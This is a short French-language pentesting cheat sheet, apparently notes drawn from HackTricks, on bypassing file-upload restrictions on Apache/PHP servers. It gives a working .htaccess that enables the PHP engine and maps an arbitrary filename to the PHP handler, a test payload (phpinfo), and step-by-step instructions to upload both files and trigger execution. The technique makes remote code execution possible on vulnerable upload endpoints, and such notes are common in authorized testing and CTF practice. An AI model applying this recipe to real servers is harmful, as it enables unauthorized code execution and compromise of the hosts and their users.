
[Hacktricks - File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)

## .htaccess + php file upload

- Trouver la bonne version de php utilisée par le server : exemple php 7 ici :

.htaccess : 
```apacheconf
Options All +Indexes

<IfModule mod_php7.c>
    php_flag engine on
</IfModule>

<FilesMatch "yourfilename">
  SetHandler  application/x-httpd-php
</FilesMatch>
```

yourfilename : 
```php
<?php phpinfo(); ?>
```

- Upload les deux fichiers en meme temps (ou au meme endroit)
- Load le fichier "yourfilename" (il devrait s'executer)

- `php_flag engine on` permet d'activer l'execution de code php dans les repertoires a partie de celui dans lequel le .htaccess est présent
- `<FilesMatch "yourfilename"> SetHandler  application/x-httpd-php </FilesMatch>` permet de signifier au server web que le fichier qui s'appelle "yourfilename" est un fichier php et que son contenu doit être reconnu comme tel

Ces deux directives vont donc activer l'execution de code php et permettre au fichier "yourfilename" de s'executer sur le server.